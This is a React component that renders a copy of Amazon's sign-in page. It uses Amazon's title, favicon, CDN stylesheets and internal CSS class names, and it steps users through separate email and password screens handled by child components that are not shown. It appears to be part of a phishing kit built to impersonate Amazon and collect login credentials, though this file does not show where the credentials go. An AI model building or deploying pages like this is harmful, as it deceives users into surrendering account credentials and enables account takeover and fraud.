import React, { useState } from 'react';
import { Helmet } from 'react-helmet';
import EmailLaptop from './EmailLaptop';
import PassLaptop from './PassLaptop';

export default function SigninLaptop() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showErrorPass, setShowErrorPass] = useState(false);
    const [emptyPass, setEmptyPass] = useState(false);
    const [showErrorEmail, setShowErrorEmail] = useState(false);
    const [emptyEmail, setEmptyEmail] = useState(false);
    const [navigate, setNavigate] = useState(false);

    document.body.className = '';
    document.body.classList.add(
        'auth-no-skin',
        'ap-locale-en_US',
        'a-m-us',
        'a-aui_72554-c',
        'a-aui_accordion_a11y_role_354025-c',
        'a-aui_killswitch_csa_logger_372963-c',
        'a-aui_pci_risk_banner_210084-c',
        'a-aui_preload_261698-c',
        'a-aui_rel_noreferrer_noopener_309527-c',
        'a-aui_template_weblab_cache_333406-c',
        'a-aui_tnr_v2_180836-c',
        'a-meter-animate',
    );

    return (
        <>
            <Helmet
                htmlAttributes={{
                    class: 'a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember',
                }}
            >
                <meta charset="utf-8" />
                <title dir="ltr">Amazon Sign-In</title>
                <link
                    href="https://www.amazon.com/favicon.ico"
                    rel="shortcut icon"
                    type="image/x-icon"
                />
                <link
                    rel="stylesheet"
                    href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident"
                />
                <link
                    rel="stylesheet"
                    href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51ndJ60shfL.css_.css?AUIClients/AuthenticationPortalAssets"
                />
                <link
                    rel="stylesheet"
                    href="https://images-na.ssl-images-amazon.com/images/I/21PFuszay6L.css?AUIClients/CVFAssets"
                />
            </Helmet>
            {navigate ? (
                <PassLaptop
                    email={email}
                    password={password}
                    setPassword={setPassword}
                    showErrorPass={showErrorPass}
                    setShowErrorPass={setShowErrorPass}
                    emptyPass={emptyPass}
                    setEmptyPass={setEmptyPass}
                    setNavigate={setNavigate}
                />
            ) : (
                <EmailLaptop
                    email={email}
                    setEmail={setEmail}
                    showErrorEmail={showErrorEmail}
                    setShowErrorEmail={setShowErrorEmail}
                    emptyEmail={emptyEmail}
                    setEmptyEmail={setEmptyEmail}
                    setNavigate={setNavigate}
                />
            )}
        </>
    );
}
